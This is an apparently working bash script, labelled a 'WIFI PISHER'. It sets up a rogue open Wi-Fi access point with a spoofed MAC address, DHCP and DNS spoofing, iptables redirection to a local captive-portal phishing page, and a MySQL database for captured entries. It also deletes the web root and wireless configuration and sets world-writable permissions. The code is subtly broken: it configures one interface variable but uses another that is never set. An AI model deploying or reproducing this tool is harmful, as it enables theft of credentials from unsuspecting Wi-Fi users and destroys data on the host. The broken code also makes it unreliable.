#!/bin/bash

essid="SUPER_SECURE_WIFI"
canal=1

titulo () {
	clear
	printf '\e[1;31m%-4s\e[m' "
            / -.
 	   /    -.
 	 O/       -.
	 |          -.
 	 /\            -.
	 \_\_             -.
       ########~~~~~~~~~~~~~~ WIFI PISHER by HACEFRESKO

"
}

selectNetworkInterface () {
	nInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]' | wc -l)
	nMonInterfaces=$(airmon-ng | grep -oiE 'wlan[0-9]mon' | wc -l)

	if [ $nInterfaces -eq 1 ]
	then
		echo
		echo "[-] Configuring network interface..."
		echo
		if [ $nMonInterfaces -eq 0 ]
		then
                        tempInterface=$(airmon-ng | grep -oiE 'wlan[0-9]')
                        tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
                        if [ "$tempStatus" != "enabled" ]
                        then
				echo
                                echo "[x] Network interface couldn't be put in monitor mode"
                                echo
				ok=0
                        else
				interface="$tempInterface"mon
	                        ok=1
			fi
		else
			interface=$(airmon-ng | grep -oiE 'wlan[0-9]mon')
                        ok=1
		fi
	elif [ $nInterfaces -gt 1 ]
	then
		echo
		echo "Network interfaces:"
		echo
		line=4
		i=1

		interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "	" -f 2)
                printf '%-4s %-4s %-10s\n' "[$i]" " -> " "${interface[$i]}"
		while [ ${interface[$i]} ]
		do
			line=$(( $line + 1 ))
                       	i=$(( $i + 1 ))

			interface[$i]=$(airmon-ng | sed -n "$line"p | cut -d "	" -f 2)
			printf '%-4s %-4s %-10s\n' "[$i]" " -> " "${interface[$i]}"
			line=$(( $line + 1 ))
			i=$(( $i + 1 ))
		done
		echo
		echo -n "Select a network interface > "
		read op
		echo

		tempInterface=${interface[$op]}
		substring=$(echo $tempInterface | grep "mon")
		if [ $substring ]
		then
			interface="$tempInterface"
	                ok=1
		else
			tempStatus=$(airmon-ng start $tempInterface | grep -o enabled)
			if [ "$tempStatus" != "enabled" ]
			then
				echo
				echo "[x] Selected network interface couldn't be put in monitor mode"
				echo
				ok=0
			else
				interface="$tempInterface"mon
		                ok=1
			fi
		fi
	else
		echo
		echo "[x] No network interface found"
		echo
		ok=0
	fi

	if [ $ok -eq 1 ]
	then
		echo
		echo "[+] Network interface succesfully configured"
		echo
	fi
}

selectNetworkInterface
if [ $ok -eq 1 ]
then

################################ PROGRAMS NEEDED ####################################

	apt-get install -y hostapd apache2 dnsmasq aircrack-ng gnome-terminal

######################### IPTABLES FLUSH TO AVOID CONFLICTS ##########################

	iptables -F
	iptables -t nat -F

############################# POWER UP WI-FI INTERFACE ###############################

	ifconfig $interfaz down
	iw reg set US

################################ CHANGE MAC ADDRESS ##################################

	macchanger -r $interfaz
	ifconfig $interfaz up
	clear

	rm -r /root/fakeap
	mkdir /root/fakeap

################################# HOSTAPD CONFIG #####################################

	echo "interface=$interfaz
driver=nl80211
ssid=$essid
hw_mode=g
channel=$canal
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
" > /root/fakeap/hostapd.conf

	gnome-terminal --geometry 118x24+0+0 -e "bash -c \"clear; hostapd /root/fakeap/hostapd.conf; exec bash\"" -q -t "$essid $canal"
	clear

########################## DNSMASQ CONFIG (DNS & DHCP) ###############################

	# Stops dnsmasq daemon on port 53
	service dnsmasq stop

	# Checks for Internet connection
	conex=$(ping -c 3 google.com | grep -oiwE '[100-0]\%' | grep -oiwE '[100-0]')

	if [ $conex -lt 100 ]
	then

		echo "interface=$interfaz
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1" > /root/fakeap/dnsmasq.conf

		# IPTABLES CONFIG IF THE MACHINE HAS CONNECTION

		# We redirect to 10.0.0.1:80 everything going to port 80 of this machine
		iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80

		# Everything going out this machine goes by eth0 and masqued
		iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE

	else

		echo "interface=$interfaz
dhcp-range=10.0.0.10,10.0.0.250,255.255.255.0,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
listen-address=127.0.0.1
address=/#/10.0.0.1" > /root/fakeap/dnsmasq.conf

	fi
	
	# Configures dnsmasq to assign the interface ip with the domain name so mod_rewrite
	# (.htaccess) can reffer directly to the domain name in the URL
	echo "10.0.0.1 wifiportal2.aire.es" > /root/fakeap/hosts

	ifconfig $interfaz 10.0.0.1

	gnome-terminal --geometry 118x24+0+1000 -e "bash -c \"clear; dnsmasq -C /root/fakeap/dnsmasq.conf -H /root/fakeap/hosts -d; exec bash\"" -q -t "DHCP"

################################### WEB FILES #########################################

	rm -r /var/www/html/*
	cp -r captive /var/www/html/captive
	cp .htaccess /var/www/html
	chmod 777 /var/www/html/.htaccess
	chmod 777 /var/www/html/captive
	chmod 777 /var/www/html/captive/*

	cp -f override.conf /etc/apache2/conf-available/

	# Enables rewrite and override for .htaccess
	a2enconf override
	a2enmod rewrite

	# Removes previous wireless configuration
	rm -rf /etc/wpa_supplicant/wpa_supplicant.conf

	service apache2 reload
	service apache2 restart
	service mysql start
	export -f titulo
	gnome-terminal --geometry 118x48+1000+0 -e "bash -c \"titulo; mysql; exec bash\"" -q -t "Database"

	rm -r /root/fakeap

	clear
fi
